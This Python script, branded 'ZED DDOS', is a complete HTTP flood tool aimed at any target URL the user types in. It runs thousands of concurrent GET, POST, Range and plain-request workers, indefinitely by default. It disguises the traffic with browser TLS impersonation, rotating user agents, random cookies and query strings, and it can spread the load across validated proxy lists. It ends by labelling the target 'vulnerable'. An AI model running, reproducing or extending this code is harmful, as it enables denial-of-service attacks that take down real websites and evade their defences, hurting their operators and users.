import asyncio
import random
import string
import os
import time
from collections import Counter
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode
from typing import Optional

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

from curl_cffi.requests import AsyncSession
import typing as _t
from curl_cffi.requests.impersonate import BrowserTypeLiteral

from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.align import Align
from rich.text import Text

console = Console()

_IMP = list(_t.get_args(BrowserTypeLiteral))
_PREF = ("chrome152", "chrome151", "chrome150", "chrome146", "chrome145",
         "chrome142", "chrome136", "chrome133a", "chrome131", "chrome", "chrome124")


def pick_impersonate():
    for c in _PREF:
        if c in _IMP:
            return c
    return _IMP[0] if _IMP else "chrome"


def clear():
    os.system("cls" if os.name == "nt" else "clear")


BANNER = r"""
  ██╗      ██╗██████╗   ██████╗ 
██║ ██╔╝   ██╔══██╗     ██╔══██╗
█████╔╝    ██████╔╝     ██║  ██║
██╔═██╗    ██╔══██╗     ██║  ██║
██║  ██╗   ██║  ██║     ██████╔╝
╚═╝  ╚═╝   ╚═╝  ╚═╝     ╚═════╝ 

"""


def show_banner():
    clear()
    console.print(Align.center(Text(BANNER, style="bold red")))
    console.print(Align.center(Text("=" * 55, style="cyan")))
    console.print(Align.center(Text("Z E D   D D O S", style="bold yellow")))
    console.print(Align.center(Text("=" * 55, style="cyan")))
    console.print(Align.center(Text(
        "4 vectors  |  " + pick_impersonate() + " tls  |  unlimited",
        style="white")))
    console.print(Align.center(Text("=" * 55, style="cyan")))
    console.print()


@dataclass
class Stats:
    v1_sent: int = 0
    v1_ok: int = 0
    v1_fail: int = 0
    v1_bytes: int = 0
    v1_codes: Counter = field(default_factory=Counter)
    v2_sent: int = 0
    v2_ok: int = 0
    v2_fail: int = 0
    v2_bytes: int = 0
    v2_codes: Counter = field(default_factory=Counter)
    v3_sent: int = 0
    v3_ok: int = 0
    v3_fail: int = 0
    v3_bytes: int = 0
    v3_codes: Counter = field(default_factory=Counter)
    v4_sent: int = 0
    v4_ok: int = 0
    v4_fail: int = 0
    v4_bytes: int = 0
    v4_codes: Counter = field(default_factory=Counter)
    start_time: float = field(default_factory=time.time)

    def _rec(self, vec, status, nbytes):
        setattr(self, vec + "_sent", getattr(self, vec + "_sent") + 1)
        setattr(self, vec + "_bytes", getattr(self, vec + "_bytes") + nbytes)
        if status is not None:
            setattr(self, vec + "_ok", getattr(self, vec + "_ok") + 1)
            getattr(self, vec + "_codes")[status] += 1
        else:
            setattr(self, vec + "_fail", getattr(self, vec + "_fail") + 1)

    def rec_v1(self, s, n=0): self._rec("v1", s, n)
    def rec_v2(self, s, n=0): self._rec("v2", s, n)
    def rec_v3(self, s, n=0): self._rec("v3", s, n)
    def rec_v4(self, s, n=0): self._rec("v4", s, n)


def make_layout(stats: Stats):
    elapsed = time.time() - stats.start_time
    total_sent = stats.v1_sent + stats.v2_sent + stats.v3_sent + stats.v4_sent
    total_ok = stats.v1_ok + stats.v2_ok + stats.v3_ok + stats.v4_ok
    total_fail = stats.v1_fail + stats.v2_fail + stats.v3_fail + stats.v4_fail
    total_bytes = stats.v1_bytes + stats.v2_bytes + stats.v3_bytes + stats.v4_bytes
    rps = total_sent / elapsed if elapsed > 0 else 0
    mbps = (total_bytes / (1024 * 1024)) / elapsed if elapsed > 0 else 0
    success_rate = (total_ok / total_sent * 100) if total_sent > 0 else 0

    main = Table.grid(padding=1)
    main.add_column(style="bright_yellow", justify="right")
    main.add_column(style="bold white")
    main.add_row("Total Requests:", f"{total_sent:,}")
    main.add_row("Successful:", f"[bold green]{total_ok:,}[/]")
    main.add_row("Failed:", f"[bold red]{total_fail:,}[/]")
    main.add_row("Elapsed:", f"[magenta]{elapsed:.1f}s[/]")

    perf = Table.grid(padding=1)
    perf.add_column(style="bright_yellow", justify="right")
    perf.add_column(style="bold white")
    perf.add_row("Rate:", f"[bold cyan]{rps:,.0f} req/s[/]")
    perf.add_row("Data:", f"[bold cyan]{mbps:.2f} MB/s[/]")
    perf.add_row("Success Rate:", f"[bold green]{success_rate:.1f}%[/]")
    perf.add_row("TLS:", f"[blue]{pick_impersonate()}[/]")

    def vec_table(name, sent, ok, fail):
        t = Table.grid(padding=0)
        t.add_column(style="bright_yellow", justify="right")
        t.add_column(style="white")
        t.add_row(f"{name} sent:", f"{sent:,}")
        t.add_row("ok:", f"[green]{ok:,}[/]")
        t.add_row("fail:", f"[red]{fail:,}[/]")
        return t

    v1 = vec_table("GET", stats.v1_sent, stats.v1_ok, stats.v1_fail)
    v2 = vec_table("POST", stats.v2_sent, stats.v2_ok, stats.v2_fail)
    v3 = vec_table("RANGE", stats.v3_sent, stats.v3_ok, stats.v3_fail)
    v4 = vec_table("PLAIN", stats.v4_sent, stats.v4_ok, stats.v4_fail)

    top = Layout()
    top.split_row(
        Panel(main, title="[bold red]Stats[/]", border_style="bright_yellow"),
        Panel(perf, title="[bold red]Performance[/]", border_style="bright_yellow"),
    )
    bottom = Layout()
    bottom.split_row(
        Panel(v1, title="[bold]V1 GET[/]", border_style="cyan"),
        Panel(v2, title="[bold]V2 POST[/]", border_style="magenta"),
        Panel(v3, title="[bold]V3 RANGE[/]", border_style="green"),
        Panel(v4, title="[bold]V4 PLAIN[/]", border_style="blue"),
    )
    layout = Layout()
    layout.split_column(top, bottom)
    return layout


_UA_W = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36"

USER_AGENTS = [
    _UA_W.format(v="152"), _UA_W.format(v="151"), _UA_W.format(v="150"),
    _UA_W.format(v="146"), _UA_W.format(v="145"), _UA_W.format(v="142"),
    _UA_W.format(v="136"), _UA_W.format(v="131"),
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
]

_CK = ["sid", "session", "token", "auth", "uid", "visitor", "csrf", "sess", "_ga", "_gid"]
_PK = ["r", "t", "v", "id", "ref", "cb", "n", "x", "q", "s", "u", "z"]
_A = string.ascii_letters + string.digits


def _rs(n): return "".join(random.choices(_A, k=n))


def rand_url(base):
    p = urlparse(base)
    extra = urlencode({k: _rs(8) for k in random.sample(_PK, 3)})
    q = p.query + "&" + extra if p.query else extra
    return p._replace(query=q).geturl()


def rand_cookie():
    n = random.randint(2, 5)
    return "; ".join(k + "=" + _rs(random.randint(16, 32)) for k in random.sample(_CK, n))


def headers(url):
    host = urlparse(url).netloc
    cv = random.choice(["152", "151", "150", "146", "145", "142"])
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,image/apng,*/*;q=0.8,"
                  "application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8",
                                          "ar,en;q=0.9", "ku,ar;q=0.8,en;q=0.7",
                                          "de-DE,de;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Sec-Ch-Ua": '"Chromium";v="' + cv + '", "Google Chrome";v="' + cv + '", "Not(A:Brand";v="24"',
        "Sec-Ch-Ua-Mobile": random.choice(["?0", "?1"]),
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"']),
        "DNT": "1",
        "Referer": random.choice(["https://" + host + "/", "https://www.google.com/"]),
        "Cookie": rand_cookie(),
    }


def plain_headers():
    return {"User-Agent": "python-requests/2.31.0"}


def form(size):
    return {_rs(8): _rs(random.randint(64, 512)) for _ in range(max(4, size // 256))}


def normalize_proxy(raw):
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if "://" in raw:
        s, rest = raw.split("://", 1)
        s = s.lower()
        m = {"http": "http", "https": "http", "socks4": "socks4", "socks4a": "socks4",
             "socks5": "socks5", "socks5h": "socks5", "sock4": "socks4",
             "sock5": "socks5", "sock": "socks5"}
        return m.get(s, "http") + "://" + rest
    return "http://" + raw


def proxy_kind(p):
    if p.startswith("socks5://"): return "socks5"
    if p.startswith("socks4://"): return "socks4"
    return "http"


def load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = normalize_proxy(line)
            if p:
                out.append(p)
    return out


async def check_proxy(proxy, sem, timeout=8.0):
    async with sem:
        try:
            async with AsyncSession(impersonate=pick_impersonate(),
                                    proxies={"http": proxy, "https": proxy},
                                    timeout=timeout) as s:
                r = await s.get("http://httpbin.org/ip", timeout=timeout)
                if r.status_code == 200:
                    return proxy
        except Exception:
            return None
    return None


async def check_all(proxies, workers=100):
    console.print(f"[yellow][*] Checking {len(proxies)} proxies (Live/Dead separation)...[/]")
    sem = asyncio.Semaphore(workers)
    res = await asyncio.gather(*[check_proxy(p, sem) for p in proxies], return_exceptions=True)
    alive = [r for r in res if isinstance(r, str)]
    console.print(f"[green][+] Alive: {len(alive)}[/] | [red][-] Dead: {len(proxies) - len(alive)}[/]")
    return alive


async def w_v1(sess, url, stats):
    while True:
        try:
            r = await sess.get(rand_url(url), headers=headers(url), allow_redirects=True, timeout=10)
            stats.rec_v1(r.status_code, len(r.content or b""))
        except asyncio.CancelledError:
            raise
        except Exception:
            stats.rec_v1(None)


async def w_v2(sess, url, stats, size):
    while True:
        try:
            h = headers(url)
            h["Content-Type"] = "application/x-www-form-urlencoded"
            r = await sess.post(url, headers=h, data=form(size), allow_redirects=True, timeout=15)
            stats.rec_v2(r.status_code, len(r.content or b""))
        except asyncio.CancelledError:
            raise
        except Exception:
            stats.rec_v2(None)


async def w_v3(sess, url, stats):
    while True:
        try:
            h = headers(url)
            st = random.randint(0, 8192)
            h["Range"] = "bytes=" + str(st) + "-" + str(st + random.randint(512, 4096))
            r = await sess.get(rand_url(url), headers=h, allow_redirects=True, timeout=10)
            stats.rec_v3(r.status_code, len(r.content or b""))
        except asyncio.CancelledError:
            raise
        except Exception:
            stats.rec_v3(None)


async def w_v4(sess, url, stats):
    while True:
        try:
            r = await sess.get(url, headers=plain_headers(), allow_redirects=False, timeout=5)
            stats.rec_v4(r.status_code, len(r.content or b""))
        except asyncio.CancelledError:
            raise
        except Exception:
            stats.rec_v4(None)


def sess_kw(proxy, max_clients=0):
    kw = {"impersonate": pick_impersonate(), "timeout": 10}
    if max_clients > 0:
        kw["max_clients"] = max_clients
    if proxy:
        kw["proxies"] = {"http": proxy, "https": proxy}
    return kw


def split_threads(threads):
    v1 = int(threads * 0.25)
    v2 = int(threads * 0.20) 
    v3 = int(threads * 0.25)
    v4 = threads - v1 - v2 - v3 
    return v1, v2, v3, v4


async def run_direct(url, threads, duration, size, stats, stop):
    v1, v2, v3, v4 = split_threads(threads)
    async with AsyncSession(**sess_kw(None, max_clients=threads + 10)) as sess:
        tasks = [asyncio.create_task(w_v1(sess, url, stats)) for _ in range(v1)]
        tasks += [asyncio.create_task(w_v2(sess, url, stats, size)) for _ in range(v2)]
        tasks += [asyncio.create_task(w_v3(sess, url, stats)) for _ in range(v3)]
        tasks += [asyncio.create_task(w_v4(sess, url, stats)) for _ in range(v4)]
        try:
            if duration:
                await asyncio.wait_for(stop.wait(), timeout=duration)
            else:
                await stop.wait()
        except asyncio.TimeoutError:
            pass
        finally:
            for t in tasks: t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)


async def run_proxies(url, threads, duration, size, stats, stop, proxies):
    per = max(4, threads // len(proxies))
    v1, v2, v3, v4 = split_threads(per)
    runners = []

    for px in proxies:
        async def runner(p=px):
            try:
                async with AsyncSession(**sess_kw(p, max_clients=per + 10)) as sess:
                    tasks = [asyncio.create_task(w_v1(sess, url, stats)) for _ in range(v1)]
                    tasks += [asyncio.create_task(w_v2(sess, url, stats, size)) for _ in range(v2)]
                    tasks += [asyncio.create_task(w_v3(sess, url, stats)) for _ in range(v3)]
                    tasks += [asyncio.create_task(w_v4(sess, url, stats)) for _ in range(v4)]
                    try:
                        if duration:
                            await asyncio.wait_for(stop.wait(), timeout=duration)
                        else:
                            await stop.wait()
                    except asyncio.TimeoutError:
                        pass
                    finally:
                        for t in tasks: t.cancel()
                        await asyncio.gather(*tasks, return_exceptions=True)
            except Exception as e:
                console.print(f"[red][proxy][/] {p}: {type(e).__name__}")

        runners.append(asyncio.create_task(runner()))

    try:
        if duration:
            await asyncio.wait_for(stop.wait(), timeout=duration)
        else:
            await stop.wait()
    except asyncio.TimeoutError:
        pass
    finally:
        for t in runners: t.cancel()
        await asyncio.gather(*runners, return_exceptions=True)


async def orchestrate(url, threads, duration, size, live):
    stats = Stats()
    stop = asyncio.Event()

    import signal as _s
    def on_sig(*_):
        stop.set()
    try:
        _s.signal(_s.SIGINT, on_sig)
    except (ValueError, OSError):
        pass

    v1, v2, v3, v4 = split_threads(threads)
    config = f"""[white]Target[/]   : {url}
[white]Threads[/]  : {threads}
[white]V1/V2/V3/V4[/] : {v1} / {v2} / {v3} / {v4}
[white]Payload[/]  : {size} B
[white]Proxies[/]  : {len(live) if live else 'direct'}
[white]TLS[/]      : {pick_impersonate()}
[white]Duration[/] : {'infinite' if not duration else str(duration) + 's'}
[white]Mode[/]      : Unlimited (Max Power)"""

    console.print(Panel(config, title="[bold red]Launch Config[/]",
                        border_style="bright_yellow", padding=(1, 2)))

    with Live(make_layout(stats), refresh_per_second=4, console=console) as live_display:
        async def refresh():
            while not stop.is_set():
                live_display.update(make_layout(stats))
                await asyncio.sleep(0.25)

        refresh_task = asyncio.create_task(refresh())

        if live:
            await run_proxies(url, threads, duration, size, stats, stop, live)
        else:
            await run_direct(url, threads, duration, size, stats, stop)

        refresh_task.cancel()
        try:
            await refresh_task
        except (asyncio.CancelledError, Exception):
            pass
        live_display.update(make_layout(stats))

    total = stats.v1_sent + stats.v2_sent + stats.v3_sent + stats.v4_sent
    if total > 0:
        success_rate = (stats.v1_ok + stats.v2_ok + stats.v3_ok + stats.v4_ok) / total * 100
        verdict = "[bold green]VULNERABLE[/]" if success_rate > 80 else "[bold yellow]RESISTANT[/]"
        console.print(Panel(f"Target: {verdict}",
                            title="[bold red]Result[/]",
                            border_style="bright_yellow", padding=(1, 2)))


def ask(p):
    return console.input(f"[bright_yellow][[/][bold white]{p}[/][bright_yellow]][/] ").strip()


def menu():
    show_banner()

    url = ask("TARGET URL")
    if not url:
        console.print("[red][!] no target[/]")
        return None
    if "://" not in url:
        url = "http://" + url
    p = urlparse(url)
    if not p.scheme or not p.netloc:
        console.print("[red][!] invalid URL[/]")
        return None

    console.print("\n[yellow][?] proxy file (empty = direct)[/]")
    console.print("[dim]    http, https, socks4, socks5[/]")
    pp = ask("PROXY FILE")

    live = []
    if pp:
        proxies = load_proxies(pp)
        if not proxies:
            console.print("[red][!] no proxies. direct[/]")
        else:
            try:
                live = asyncio.run(check_all(proxies, workers=100))
            except Exception as e:
                console.print(f"[red][!] check failed: {e}[/]")
                live = []
            if live:
                counts = Counter(proxy_kind(x) for x in live)
                parts = ", ".join(k + "=" + str(v) for k, v in counts.items())
                console.print(f"[green][+] {len(live)} alive ({parts})[/]")
            else:
                console.print("[red][!] none alive. direct[/]")

    t = ask("THREADS (default 4000)")
    try:
        threads = int(t) if t else 4000
    except ValueError:
        threads = 4000
    if threads < 4:
        threads = 4

    d = ask("DURATION sec (empty = infinite)")
    try:
        duration = int(d) if d else None
    except ValueError:
        duration = None

    ps = ask("POST BYTES (default 4096)")
    try:
        size = int(ps) if ps else 4096
    except ValueError:
        size = 4096

    return {"url": url, "threads": threads, "duration": duration, "payload": size, "proxies": live}


def main():
    try:
        import resource
        s, h = resource.getrlimit(resource.RLIMIT_NOFILE)
        new = min(65535, h) if h != resource.RLIM_INFINITY else 65535
        resource.setrlimit(resource.RLIMIT_NOFILE, (new, h))
    except (ImportError, ValueError, OSError):
        pass

    try:
        cfg = menu()
        if cfg is None:
            return
        asyncio.run(orchestrate(cfg["url"], cfg["threads"], cfg["duration"],
                                cfg["payload"], cfg["proxies"]))
    except KeyboardInterrupt:
        console.print("\n[yellow][!] stopped[/]")


if __name__ == "__main__":
    main()
